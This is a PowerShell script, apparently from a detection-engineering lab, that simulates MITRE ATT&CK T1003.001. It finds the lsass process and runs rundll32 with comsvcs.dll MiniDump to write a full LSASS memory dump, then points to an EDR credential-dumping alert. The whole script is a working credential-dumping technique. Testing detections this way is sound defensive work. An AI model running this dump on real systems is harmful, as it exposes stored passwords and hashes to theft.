# Scenario 2 Attack Simulation: LSASS Memory Dump via comsvcs.dll
Write-Host "[*] Executing MITRE ATT&CK T1003.001 (LSASS Memory Dump)..." -ForegroundColor Yellow

$lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
if (!$lsass) {
    Write-Host "[!] Could not find lsass process. Run this script as Administrator!" -ForegroundColor Red
    exit
}

$outputDir = "C:\LabAttacks"
if (!(Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir -Force | Out-Null }

$pidNum = $lsass.Id
$dumpFile = "$outputDir\lsass_simulated.dmp"
$command = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pidNum $dumpFile full"

Write-Host "[*] Running command: $command" -ForegroundColor Gray
cmd.exe /c $command 2>$null

Write-Host "[✓] Attack executed. Check LimaCharlie EDR for P1 Credential Dumping alert." -ForegroundColor Green
